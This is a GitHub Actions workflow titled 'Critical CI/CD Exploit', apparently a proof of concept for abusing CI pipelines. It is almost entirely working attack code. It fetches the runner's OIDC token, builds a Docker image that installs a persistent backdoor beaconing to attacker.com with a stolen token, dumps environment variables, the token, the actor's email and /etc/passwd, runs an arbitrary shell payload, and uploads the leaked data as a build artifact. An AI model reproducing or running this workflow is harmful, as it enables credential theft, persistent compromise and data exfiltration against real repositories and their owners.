name: Critical CI/CD Exploit

on:
  push:
    branches: [ main ]

jobs:
  attack:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read

    steps:
      - name: Checkout Repository
        uses: actions/checkout@v4

      - name: Get OIDC Token and Prepare Payload
        id: get_token
        run: |
          echo "--- Debugging OIDC Token Request Environment Variables ---"
          echo "ACTIONS_ID_TOKEN_REQUEST_TOKEN directly from shell env: '$ACTIONS_ID_TOKEN_REQUEST_TOKEN'"
          echo "ACTIONS_ID_TOKEN_REQUEST_URL directly from shell env: '$ACTIONS_ID_TOKEN_REQUEST_URL'"
          echo "--------------------------------------------------------"

          if [ -z "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then
            echo "Error: ACTIONS_ID_TOKEN_REQUEST_URL is empty. Cannot fetch OIDC token. Exiting."
            exit 1
          fi

          OIDC_TOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL")

          echo "OIDC_TOKEN_VALUE=$OIDC_TOKEN" >> "$GITHUB_OUTPUT"

          # Prepare malicious Dockerfile directory
          mkdir -p ./taskcluster/docker/python

          # Write the Dockerfile here
          cat <<'EOF_DOCKERFILE' > ./taskcluster/docker/python/Dockerfile
FROM python:3.11-alpine
ARG PAYLOAD
ARG OIDC_TOKEN
ARG ACTOR_EMAIL

RUN apk add --no-cache curl jq && \
    echo "[+] Installing backdoor..." && \
    echo '#!/bin/sh' > /usr/local/bin/init.sh && \
    echo 'curl -s http://attacker.com/exfil?token=$(cat /token)' >> /usr/local/bin/init.sh && \
    chmod +x /usr/local/bin/init.sh && \
    echo "@reboot /usr/local/bin/init.sh" >> /etc/crontabs/root && \
    echo "/usr/local/bin/init.sh" >> /etc/profile && \
    echo "[+] Dumping secrets..." && \
    { \
      echo "===== ENV ====="; \
      printenv; \
      echo "===== OIDC TOKEN ====="; \
      echo "$OIDC_TOKEN"; \
      echo "===== ACTOR EMAIL ====="; \
      echo "$ACTOR_EMAIL"; \
      echo "===== /etc/passwd ====="; \
      cat /etc/passwd; \
    } > /leaks.txt && \
    sh -c "$PAYLOAD"
EOF_DOCKERFILE

          # Malicious payload example
          MALICIOUS_PAYLOAD="whoami && hostname && id && cat /etc/passwd"
          echo "MALICIOUS_PAYLOAD_VALUE=$MALICIOUS_PAYLOAD" >> "$GITHUB_OUTPUT"

      - name: Get Actor Email from GitHub API
        id: get_email
        run: |
          ACTOR="${{ github.actor }}"
          EMAIL=$(curl -s https://api.github.com/users/$ACTOR | jq -r '.email // "none"')
          echo "ACTOR_EMAIL=$EMAIL" >> $GITHUB_OUTPUT

      - name: Build and Run Malicious Docker Image
        run: |
          docker build \
            --build-arg PAYLOAD="${{ steps.get_token.outputs.MALICIOUS_PAYLOAD_VALUE }}" \
            --build-arg OIDC_TOKEN="${{ steps.get_token.outputs.OIDC_TOKEN_VALUE }}" \
            --build-arg ACTOR_EMAIL="${{ steps.get_email.outputs.ACTOR_EMAIL }}" \
            -t malicious \
            ./taskcluster/docker/python

          docker run --rm malicious cat /leaks.txt > leaks.txt

      - name: Upload Exfiltrated Data
        uses: actions/upload-artifact@v4
        with:
          name: ci-leaks
          path: leaks.txt
